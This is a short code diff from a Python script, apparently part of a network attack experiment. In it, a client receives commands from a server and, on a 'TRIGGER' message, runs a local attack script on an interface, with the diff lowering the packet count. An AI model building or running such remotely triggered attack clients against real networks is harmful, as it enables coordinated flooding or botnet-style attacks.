@@ -23,7 +23,7 @@ def connect_to_svr(bad_addr, name):
         cmdr=sock.recv(512)
         if 'TRIGGER'==cmdr:
             #trigger attack
-            system('python2 try/{}.py -i {}-eth0 -n 1000000'.format(name, name))
+            system('python2 try/{}.py -i {}-eth0 -n 100000'.format(name, name))
         elif 'EXIT'==cmdr:
             break
 
